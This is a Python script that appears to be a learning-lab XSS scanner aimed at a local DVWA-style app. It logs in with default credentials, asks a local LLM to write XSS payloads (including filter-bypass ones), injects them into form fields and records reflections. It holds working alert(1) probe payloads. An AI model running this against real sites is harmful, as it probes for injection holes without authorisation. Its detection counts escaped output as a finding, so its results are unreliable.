import requests
import json
import os
from bs4 import BeautifulSoup
from html import unescape
from openai import OpenAI
from dotenv import load_dotenv

load_dotenv()

BASE = "http://localhost:8080/"
LOGIN_URL = BASE + "login.php"

session = requests.Session()

# ---------- OLLAMA CONFIG ----------
OLLAMA_BASE_URL = os.getenv("OLLAMA_BASE_URL", "http://localhost:11434/v1")
OLLAMA_MODEL = os.getenv("OLLAMA_MODEL", "qwen3.5:397b-cloud")

client = OpenAI(
    base_url=OLLAMA_BASE_URL,
    api_key="ollama"
)

print(f"[+] Using Ollama model: {OLLAMA_MODEL}")


# ---------- LLM XSS PAYLOAD GENERATOR ----------
def generate_xss_payloads(form):

    prompt = f"""
You are a cybersecurity penetration tester.

Generate 6 diverse XSS payloads for this form.

Form details:
{json.dumps(form, indent=2)}

Requirements:
- Reflected XSS
- Attribute-based payloads
- Event handlers (onerror, onload, etc.)
- Filter bypass payloads
- Keep them short

Return ONLY JSON list.

Example:
[
 "<script>alert(1)</script>",
 "\"><img src=x onerror=alert(1)>",
 "<svg/onload=alert(1)>"
]
"""

    try:
        response = client.chat.completions.create(
            model=OLLAMA_MODEL,
            messages=[{"role": "user", "content": prompt}]
        )

        text = response.choices[0].message.content.strip()

        # Clean markdown if present
        text = text.replace("```json", "").replace("```", "").strip()

        payloads = json.loads(text)

        if isinstance(payloads, list) and payloads:
            print("[+] LLM Payloads Generated")
            return payloads

    except Exception as e:
        print("[-] LLM payload generation failed:", e)

    # fallback payloads
    return [
        "<script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "'><script>alert(1)</script>"
    ]


# ---------- LOGIN ----------
def login():

    res = session.get(LOGIN_URL)
    soup = BeautifulSoup(res.text, "html.parser")

    token = soup.find("input", {"name": "user_token"})
    token_value = token["value"] if token else ""

    data = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": token_value
    }

    login_res = session.post(LOGIN_URL, data=data)

    if "logout.php" in login_res.text:
        print("[+] Login successful\n")
    else:
        print("[-] Login failed")
        exit()

    session.cookies.set("security", "low")


# ---------- LOAD FORMS ----------
def load_forms():
    try:
        with open("forms.json", "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception as e:
        print("Error loading forms:", e)
        return []


# ---------- XSS SCANNER ----------
def scan_xss(forms):

    vulnerabilities = []
    seen = set()

    for form in forms:

        page = form.get("page")
        action = form.get("action")
        method = form.get("method", "get").lower()
        inputs = form.get("inputs", [])

        if not page:
            continue

        if action and "login.php" in action:
            continue

        print(f"[+] Scanning: {page}")

        # 🔥 LLM payloads
        payloads = generate_xss_payloads(form)

        for payload in payloads:

            data = {}

            for inp in inputs:
                name = inp.get("name")
                if not name:
                    continue

                if inp.get("type") == "submit":
                    data[name] = "Submit"
                else:
                    data[name] = payload

            try:
                if method == "post":
                    res = session.post(page, data=data, timeout=10)
                else:
                    res = session.get(page, params=data, timeout=10)

                content = unescape(res.text)

                # 🔍 Detection logic
                reflected = payload in content
                reflected_case = payload.lower() in content.lower()
                escaped = payload.replace("<", "&lt;") in content

                if reflected or reflected_case or escaped:

                    key = page + payload
                    if key in seen:
                        continue

                    seen.add(key)

                    print("\n[!!!] XSS Found")
                    print("URL:", page)
                    print("Payload:", payload)

                    if escaped:
                        print("Type: Escaped XSS (possible bypass)")
                    else:
                        print("Type: Reflected XSS")

                    vulnerabilities.append({
                        "type": "XSS",
                        "url": page,
                        "payload": payload,
                        "method": method,
                        "note": "escaped" if escaped else "reflected"
                    })

            except requests.exceptions.RequestException:
                continue

    return vulnerabilities


# ---------- MAIN ----------
if __name__ == "__main__":

    login()

    forms = load_forms()

    print("[+] Starting XSS Scan...\n")

    vulnerabilities = scan_xss(forms)

    with open("xss_vulnerabilities.json", "w", encoding="utf-8") as f:
        json.dump(vulnerabilities, f, indent=4)

    print(f"\n[+] Scan Completed: {len(vulnerabilities)} vulnerabilities found")